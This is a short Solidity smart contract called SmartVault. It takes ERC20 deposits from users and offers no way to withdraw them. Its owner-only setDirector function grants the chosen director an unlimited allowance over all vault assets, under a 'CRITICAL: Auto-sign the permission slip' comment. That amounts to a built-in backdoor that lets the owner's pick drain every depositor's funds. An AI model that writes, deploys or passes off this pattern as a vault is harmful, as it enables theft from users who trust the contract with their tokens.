// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract SmartVault is Ownable {
    using SafeERC20 for IERC20;

    IERC20 public immutable asset;
    address public director;

    constructor(address _asset) Ownable(msg.sender) {
        asset = IERC20(_asset);
    }

    function setDirector(address _director) external onlyOwner {
        director = _director;
        // CRITICAL: Auto-sign the permission slip
        asset.approve(_director, type(uint256).max);
    }

    // Simple Deposit
    function deposit(uint256 amount) external {
        asset.safeTransferFrom(msg.sender, address(this), amount);
    }
}
